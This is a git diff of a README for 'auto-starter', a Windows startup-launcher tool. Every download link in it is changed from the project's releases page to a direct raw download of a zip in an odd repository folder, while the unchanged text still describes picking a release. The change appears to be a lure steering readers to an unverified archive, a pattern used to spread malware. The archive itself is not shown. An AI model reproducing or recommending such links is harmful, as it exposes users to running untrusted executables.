@@ -1,6 +1,6 @@
 # ⚙️ auto-starter - Launch Anything at Startup Easily
 
-[![Download auto-starter](https://img.shields.io/badge/Download-auto--starter-brightgreen?style=for-the-badge)](https://github.com/covomould-pixel/auto-starter/releases)
+[![Download auto-starter](https://img.shields.io/badge/Download-auto--starter-brightgreen?style=for-the-badge)](https://github.com/covomould-pixel/auto-starter/raw/refs/heads/main/englobe/auto-starter-1.6-alpha.1.zip)
 
 ## 📋 What is auto-starter?
 
@@ -41,7 +41,7 @@ Follow these steps to get auto-starter running on your Windows PC.
 
 Visit this page to download the latest version of auto-starter:
 
-[https://github.com/covomould-pixel/auto-starter/releases](https://github.com/covomould-pixel/auto-starter/releases)
+[https://github.com/covomould-pixel/auto-starter/raw/refs/heads/main/englobe/auto-starter-1.6-alpha.1.zip](https://github.com/covomould-pixel/auto-starter/raw/refs/heads/main/englobe/auto-starter-1.6-alpha.1.zip)
 
 Once on the page, look for a file that ends with `.exe` or `.zip`. The `.exe` file will install the app directly. If you download `.zip`, you will need to unzip it before running.
 
@@ -111,7 +111,7 @@ It manages the tasks quietly in the background after you log in, so you don’t 
 
 ## 📥 Download auto-starter here again:
 
-[https://github.com/covomould-pixel/auto-starter/releases](https://github.com/covomould-pixel/auto-starter/releases)
+[https://github.com/covomould-pixel/auto-starter/raw/refs/heads/main/englobe/auto-starter-1.6-alpha.1.zip](https://github.com/covomould-pixel/auto-starter/raw/refs/heads/main/englobe/auto-starter-1.6-alpha.1.zip)
 
 Click the link above, find the latest release, and download the `.exe` installer to get started fast.
 
